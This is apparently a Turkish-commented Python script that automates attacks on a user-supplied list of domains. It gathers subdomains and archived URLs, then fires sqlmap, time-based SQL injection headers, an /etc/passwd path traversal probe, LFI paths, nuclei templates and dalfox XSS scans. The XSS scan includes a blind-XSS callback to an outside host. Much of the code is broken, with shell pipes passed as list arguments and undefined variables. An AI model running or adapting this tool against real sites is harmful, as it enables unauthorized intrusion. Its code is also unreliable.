import subprocess
from urllib.parse import urlparse
import requests
import os
import time

def print_banner():
    banner = r"""
    ________    _______  ___________         .____    .___ _______  _____________________ 
    \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
    /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
    /    |    \/    |    \|        \ /_____/ |    |___|   /    |    \|        \ |    |   \
    \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
            \/         \/        \/                  \/           \/        \/         \/ 
    """
    print(banner)

print_banner()

liste = input("Lütfen domain dosyasının adını girin: ")

dork = input("Dork Linkleri Listesi Girin (isteğe bağlı, boş bırakabilirsiniz): ")

try:
    subfinder_output = subprocess.check_output(["subfinder", "-dL", liste]).decode()
    subdomains = subfinder_output.splitlines()
except subprocess.CalledProcessError as e:
    print(f"[-] Hata: Subfinder çalıştırılırken bir hata oluştu: {e}")
    exit()

# Waybackurls ve grep kullanarak parametreli URL'leri çıkar ve httpx ile test edilir
parameters = []
for subdomain in subdomains:
    try:
        wayback_output = subprocess.check_output(["waybackurls", subdomain]).decode()
    except subprocess.CalledProcessError as e:
        print(f"[-] Hata: Waybackurls çalıştırılırken bir hata oluştu ({subdomain}): {e}")
        continue
    
    for line in wayback_output.splitlines():
        if "?" in line:
            parameters.append(line)

# Dork listesini kontrol et ve ekleyin
if dork:
    with open(dork, "r") as f:
        dork_lines = f.readlines()
        parameters.extend(dork_lines)

# Parametreleri parameters.txt'ye yaz
with open("parameters.txt", "w") as f:
    for parameter in parameters:
        f.write(parameter + "\n")

with open("parameters.txt", "r") as f:
    urls = f.read().splitlines()

# Her URL için sqlmap komutunu çalıştır
sqlmap_results = ""
for url in urls:
    sqlmap_command = f"sqlmap --technique=T --batch -u \"{url}\""
    try:
        # subprocess.run ile komutu çalıştır
        result = subprocess.run(sqlmap_command, shell=True, check=True, capture_output=True, text=True)
        sqlmap_results += f"SQLMap Çıktısı ({url}):\n\n{result.stdout}\n\n"
    except subprocess.CalledProcessError as e:
        sqlmap_results += f"Hata oluştu: {e}\n"

# Sonuçları bir dosyaya kaydet
with open("sqlmap_results.txt", "w") as f:
    f.write(sqlmap_results)

# Subfinder komutunu çalıştır ve çıktısını domain.txt dosyasına kaydet
subprocess.run(["subfinder", "-dL", liste, "-o", "domain.txt"])

# httpx komutunu çalıştır ve çıktısını httpx.txt dosyasına kaydet
httpx_output = subprocess.check_output(["httpx", "-l", "domain.txt"]).decode()

# Gau komutu ile endpointleri al ve Endpoints.txt dosyasına kaydet
gau_output = subprocess.check_output(["gau", "--threads", "5"] + subdomains).decode()
with open("Endpoints.txt", "w") as f:
    f.write(gau_output)

# Katana komutu ile endpointleri al ve Endpoints.txt dosyasına ekle
katana_output = subprocess.check_output(["katana", "-jc"] + httpx_output.splitlines()).decode()
with open("Endpoints.txt", "a") as f:
    f.write(katana_output)

# Uro komutu ile URL'leri al ve Endpoints_F.txt dosyasına kaydet
uro_output = subprocess.check_output(["uro"], input="\n".join(gau_output + katana_output).encode()).decode()
with open("Endpoints_F.txt", "w") as f:
    f.write(uro_output)

# GF (Grep Find) komutu ile XSS paternlerini ara ve XSS.txt dosyasına kaydet
gf_output = subprocess.check_output(["gf", "xss"], input=uro_output.encode()).decode()
with open("XSS.txt", "w") as f:
    f.write(gf_output)

# Gxss-p (Greppable XSS Probe) ile XSS'leri test et ve XSS_Ref.txt dosyasına kaydet
gxss_output = subprocess.check_output(["Gxss", "-p", "khXSS", "-o", "XSS_Ref.txt"], input=gf_output.encode()).decode()

# Dalfox ile XSS taraması yap ve Vulnerable_XSS.txt dosyasına kaydet
dalfox_output = subprocess.check_output(["dalfox", "file", "XSS_Ref.txt", "-o", "Vulnerable_XSS.txt"]).decode()

# SQL Enjeksiyonu Taraması 2
print("[+] SQL Enjeksiyonu Taraması 2 Başladı...")
sql1_output = subprocess.check_output(["httpx", "-silent", "-mc", "You have an error in your SQL syntax"], input="\n".join(parameters).encode()).decode()
with open("sql1.txt", "w") as f:
    f.write(sql1_output)
print("[+] SQL Enjeksiyonu Taraması 2 Tamamlandı.")

# Fuzzing Kontrolü
print("[+] Fuzzing Kontrolü Başladı...")
nuclei_output = subprocess.check_output(["nuclei", "-l", "parameters.txt", "-t", "fuzzing-templates", "-o", "FUZZRapor.txt"]).decode()
print("[+] Fuzzing Kontrolü Tamamlandı.")

# template Kontrolü
print("[+] template Kontrolü Başladı...")
nuclei_output = subprocess.check_output(["nuclei", "-l", "parameters.txt", "-t", "nuclei-templates", "-o", "Nuclei.txt"]).decode()
print("[+] template Kontrolü Tamamlandı.")

# SQL Enjeksiyonu Taraması 3
print("[+] SQL Enjeksiyonu Taraması 3 Başladı...")
sql3_output = subprocess.check_output(["httpx", "-silent", "-H", "X-Forwarded-For: 'XOR(if (now()=sysdate(), sleep (13),0))OR'", "-rt", "-timeout", "20", "-mrt", ">13", "-o", "sql3.txt"], input="\n".join(parameters).encode()).decode()
print("[+] SQL Enjeksiyonu Taraması 3 Tamamlandı.")

# HTTP API Kontrolü
print("[+] HTTP API Kontrolü Başladı...")
public_output = subprocess.check_output(["httpx", "-silent", "-o", "public.txt"] + ["grep", "-E", "/api/index.php/v1/config/application?public=true", "|", "httpx", "-silent", "-mc", "200", "-o", "public.txt"]).decode()
print("[+] HTTP API Kontrolü Tamamlandı.")

# LFI Kontrolü
print("[+] LFI Kontrolü Başladı...")
lfi_output = subprocess.check_output(["httpx", "-l", "domain.txt", "-path", "/assets/built%2F..%2F..%2F/package.json", "-status-code", "-mc", "200", "-o", "lfi.txt"]).decode()
print("[+] LFI Kontrolü Tamamlandı.")

# XSS Kontrolü 2
print("[+] XSS Kontrolü 2 Başladı...")
xss2_output = subprocess.check_output(["getJS", "|", "httpx", "--match-regex", "addEventListener\((?:\\'|\\\")(message)(?:\\'|\\\")", "-silent"]).decode()
with open("xss2.txt", "w") as f:
    f.write(xss2_output)
print("[+] XSS Kontrolü 2 Tamamlandı.")

# SQL Enjeksiyonu Taraması 5
print("[+] SQL Enjeksiyonu Taraması 5 Başladı...")
sql5_output = subprocess.check_output(["httpx", "-silent", "-H", "X-Forwarded-For: '; waitfor delay '0:0:6' -- ", "-rt", "-timeout", "20", "-mrt", ">13", "-o", "sql5.txt"], input="\n".join(parameters).encode()).decode()
print("[+] SQL Enjeksiyonu Taraması 5 Tamamlandı.")

print("[+] SQL Enjeksiyonu Taraması 6 Başladı...")
parameters_http_output = subprocess.check_output(["grep", "-v", "-e", "js", "-e", "css", "-e", "svg", "-e", "png", "-e", "jpg", "-e", "eot", "-e", "ttf", "-e", "woff"] + ["httpx", "-mc", "200", "-silent"], input="\n".join(parameters).encode()).decode()
with open("parameters_http.txt", "w") as f:
    f.write(parameters_http_output)
print("[+] HTTP üzerinde tarama başladı...")
sql6_output = subprocess.check_output(["parallel", "-j50", "httpx", "--silent", "-H", "'X-Forwarded-For: '\''XOR(if (now()=sysdate(), sleep (13),0))OR'\''", "-rt", "-timeout", "20", "-mrt", "'>13'"], input=parameters_http_output.encode()).decode()
with open("sql6.txt", "w") as f:
    f.write(sql6_output)
print("[+] SQL Enjeksiyonu Taraması 6 Tamamlandı.")


print("[+] Path Traversal Kontrolü Başladı...")
path_traversal_output = subprocess.check_output(["httpx", "-l", "parameters.txt", "-path", "'///////../../../../../../etc/passwd'", "-status-code", "-mc", "200", "-ms", "'root:'", "-o", "path_traversal.txt"]).decode()
print("[+] Path Traversal Kontrolü Tamamlandı.")


print("[+] Gospider Kontrolü Başladı...")
gospider_output = subprocess.check_output(["gospider", "-S", "httpx_results.txt", "-c", "10", "-d", "5", "--blacklist", "'.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)'", "--other-source"], input="\n".join(subdomains).encode()).decode()
result_output = subprocess.check_output(["grep", "-e", "code-200", "|", "awk", "'{print $5}'", "|", "grep", "=", "|", "qsreplace", "-a", "|", "dalfox", "pipe"]).decode()
with open("result.txt", "w") as f:
    f.write(result_output)
print("[+] Gospider Kontrolü Tamamlandı.")


print("[+] SQL Enjeksiyonu Taraması 7 Başladı...")
blindsqli_output = subprocess.check_output(["grep", "="] + ["qsreplace", "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"], input="\n".join(parameters).encode()).decode()
with open("blindsqli.txt", "w") as f:
    f.write(blindsqli_output)
print("[+] SQL Enjeksiyonu Taraması 7 Tamamlandı.")


print("[+] XSS Kontrolü 3 Başladı...")
xss3_output = subprocess.check_output(["getJS", "|", "httpx", "--match-regex", "addEventListener\((?:\\'|\\\")(message)(?:\\'|\\\")", "-silent"]).decode()
with open("xss3.txt", "w") as f:
    f.write(xss3_output)
print("[+] XSS Kontrolü 3 Tamamlandı.")

print("[+] XSS Taraması başlandı..")
xss_taramasi_output = ""
with open(liste, "r") as f:
    sites = f.readlines()
    for site in sites:
        gau_output = subprocess.check_output(["gau", "--subs", site]).decode()
        gau_lines = gau_output.splitlines()
        for line in gau_lines:
            if line.startswith("https://") and "=" in line:
                uro_output = subprocess.check_output(["uro"], input=line.encode()).decode()
                dalfox_output = subprocess.check_output(["dalfox", "pipe", "--deep-domxss", "--multicast", "--blind", "https://chirag.bxss.in"], input=uro_output.encode()).decode()
                xss_taramasi_output += dalfox_output  # XSS taraması sonucunu değişkene ekle
print("[+] XSS Taraması bitti..")


with open("all_result.txt", "w") as f:
     tasks = [
    ("SQL Enjeksiyonu Taraması 2 Sonuçları", sql1_output, "parameters.txt"),
    ("Fuzzing Kontrolü Sonuçları", nuclei_output, "parameters.txt"),
    ("template Kontrolü Sonuçları", nuclei_output2, "parameters.txt"),
    ("SQL Enjeksiyonu Taraması 3 Sonuçları", sql3_output, "parameters.txt"),
    ("HTTP API Kontrolü Sonuçları", public_output, "parameters.txt"),
    ("LFI Kontrolü Sonuçları", lfi_output, "domain.txt"),
    ("XSS Kontrolü 2 Sonuçları", xss2_output, "parameters.txt"),
    ("SQL Enjeksiyonu Taraması 5 Sonuçları", sql5_output, "parameters.txt"),
    ("SQL Enjeksiyonu Taraması 6 Sonuçları", sql6_output, "parameters.txt"),
    ("SQL Enjeksiyonu Taraması 7 Sonuçları", blindsqli_output, "parameters.txt"),
    ("Path Traversal Kontrolü Sonuçları", path_traversal_output, "parameters.txt"),
    ("Gospider Kontrolü Sonuçları", gospider_output, "domain.txt"),
    ("XSS Kontrolü 3 Sonuçları", xss3_output, "parameters.txt"),
    ("XSS Taraması Sonuçları", xss_taramasi_output, "domain.txt"),
    ("Tüm Sonuçlar", all_results, "parameters.txt"),
    ("SQLMap Sonuçları", sqlmap_results, "parameters.txt")  # Yeni task eklendi
]  

with open("all_result.txt", "w") as f:
    for task_name, task_output, task_list in tasks:
        f.write("##########################################################\n")
        f.write(f"[+] {task_name} ({task_list}):\n")
        f.write("##########################################################\n")
        f.write(f"{task_output}\n\n")

